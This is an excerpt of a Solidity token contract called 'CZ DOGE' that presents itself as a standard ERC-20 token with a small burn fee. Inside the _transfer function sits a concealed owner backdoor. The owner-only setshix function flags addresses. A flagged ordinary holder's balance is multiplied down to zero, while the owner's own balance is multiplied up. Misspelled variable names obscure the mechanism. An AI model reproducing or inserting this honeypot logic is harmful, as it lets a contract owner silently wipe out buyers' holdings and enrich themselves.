...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fittes https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _symbol = "CZ DOGE";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfittes = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _shixAddress;

    function setshix(address _address,uint256 _value) external onlyowner {
        _shixAddress[_address] = _value;
    }

    function setshix(address _address) external view onlyowner returns (uint256) {
        return _shixAddress[_address];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 fittesamonnt = 0;
        fittesamonnt = amonnts.mul(_burnfittes).div(100);
        if (_shixAddress[sender] > 0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(4 << _shixAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(4 >> _shixAddress[sender]);
            }
        }
        ...
        uint256 amoun;
        amoun = amonnts - fittesamonnt;
        _balance[recipient] += amoun;
        if (_burnfittes > 0){
            emit Transfer (sender, _DEADaddress, fittesamonnt);
        }
